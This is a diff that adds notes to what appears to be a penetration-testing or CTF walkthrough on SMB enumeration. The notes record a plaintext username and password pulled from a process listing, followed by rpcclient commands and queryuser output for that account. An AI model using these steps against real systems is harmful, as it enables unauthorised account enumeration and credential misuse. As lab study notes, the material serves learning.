@@ -99,3 +99,43 @@ PID TTY      STAT   TIME COMMAND
 Typical samba put command 
 ``` smbclient //server/share -c 'cd c:/remote/path ; put local-file' ```
 
+https://pen-testing.sans.org/blog/2013/07/24/plundering-windows-account-info-via-authenticated-smb-sessions
+user was report-upload and password was from ps above - directreindeerflatterystable
+
+Typical command: 
+``` $ rpcclient —U <username> <WinIPaddr> ```
+I used:
+``` $ rpcclient —U report-upload 127.0.0.1 ```
+
+Converting the hex to decimal we get RID = 1000
+
+``` 
+rpcclient $> queryuser 1000
+        User Name   :   report-upload
+        Full Name   :
+        Home Drive  :   \\3ad2a65a20dd\report-upload
+        Dir Drive   :
+        Profile Path:   \\3ad2a65a20dd\report-upload\profile
+        Logon Script:
+        Description :
+        Workstations:
+        Comment     :
+        Remote Dial :
+        Logon Time               :      Thu, 01 Jan 1970 00:00:00 UTC
+        Logoff Time              :      Wed, 06 Feb 2036 15:06:39 UTC
+        Kickoff Time             :      Wed, 06 Feb 2036 15:06:39 UTC
+        Password last set Time   :      Wed, 19 Sep 2018 14:59:41 UTC
+        Password can change Time :      Wed, 19 Sep 2018 14:59:41 UTC
+        Password must change Time:      Thu, 14 Sep 30828 02:48:05 UTC
+        unknown_2[0..31]...
+        user_rid :      0x3e8
+        group_rid:      0x201
+        acb_info :      0x00000010
+        fields_present: 0x00ffffff
+        logon_divs:     168
+        bad_password_count:     0x00000000
+        logon_count:    0x00000000
+        padding1[0..7]...
+        logon_hrs[0..21]...
+rpcclient $> 
+```
